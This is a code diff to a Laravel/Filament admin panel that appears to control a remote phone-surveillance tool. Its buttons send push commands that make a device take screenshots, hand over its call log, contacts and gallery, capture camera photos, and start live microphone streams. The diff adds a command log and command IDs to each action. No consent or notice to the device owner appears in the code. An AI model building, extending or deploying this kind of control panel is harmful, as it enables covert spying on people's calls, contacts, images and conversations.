@@ -110,6 +110,11 @@ class UserResource extends Resource
                         ->label('Request Screenshot')
                         ->icon('heroicon-o-camera')
                         ->action(function (User $record) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'screenshot',
+                                'status' => 'pending',
+                            ]);
                             if (!$record->fcm_token) {
                                 \Filament\Notifications\Notification::make()
                                     ->title('No FCM Token')
@@ -128,7 +133,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'screenshot']]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'screenshot', 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Screenshot Requested')->success()->send();
                             } catch (\Exception $e) {
@@ -139,6 +144,11 @@ class UserResource extends Resource
                         ->label('Request Call Log')
                         ->icon('heroicon-o-phone')
                         ->action(function (User $record) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'backup_call_log',
+                                'status' => 'pending',
+                            ]);
                             if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
@@ -148,7 +158,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_call_log']]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_call_log', 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Call Log Requested')->success()->send();
                             } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
@@ -157,6 +167,11 @@ class UserResource extends Resource
                         ->label('Request Contacts')
                         ->icon('heroicon-o-users')
                         ->action(function (User $record) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'backup_contacts',
+                                'status' => 'pending',
+                            ]);
                             if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
@@ -166,7 +181,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_contacts']]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_contacts', 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Contacts Requested')->success()->send();
                             } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
@@ -176,6 +191,11 @@ class UserResource extends Resource
                         ->icon('heroicon-o-microphone')
                         ->color('success')
                         ->action(function (User $record) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'start_stream',
+                                'status' => 'pending',
+                            ]);
                             if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
                                 $stream = \App\Models\LiveStream::create(['user_id' => $record->id, 'status' => 'active', 'started_at' => now()]);
@@ -186,7 +206,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'start_stream', 'live_stream_id' => (string)$stream->id]]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'start_stream', 'live_stream_id' => (string)$stream->id, 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Stream Started')->success()->send();
                                 return redirect()->to(\App\Filament\Resources\LiveStreamResource::getUrl('view', ['record' => $stream->id]));
@@ -203,6 +223,12 @@ class UserResource extends Resource
                                 ->required(),
                         ])
                         ->action(function (User $record, array $data) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'capture_image',
+                                'status' => 'pending',
+                                'payload' => $data,
+                            ]);
                             if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
@@ -212,7 +238,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'capture_image', 'camera_facing' => $data['camera_facing']]]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'capture_image', 'camera_facing' => $data['camera_facing'], 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Photo Requested')->success()->send();
                             } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
@@ -228,6 +254,12 @@ class UserResource extends Resource
                                 ->required(),
                         ])
                         ->action(function (User $record, array $data) {
+                            $log = \App\Models\CommandLog::create([
+                                'user_id' => $record->id,
+                                'command' => 'backup_gallery',
+                                'status' => 'pending',
+                                'payload' => $data,
+                            ]);
                             if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
@@ -237,7 +269,7 @@ class UserResource extends Resource
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                     'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
-                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_gallery', 'media_type' => $data['media_type']]]],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_gallery', 'media_type' => $data['media_type'], 'command_id' => (string) $log->id]]],
                                 ]);
                                 \Filament\Notifications\Notification::make()->title('Gallery Backup Requested')->success()->send();
                             } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
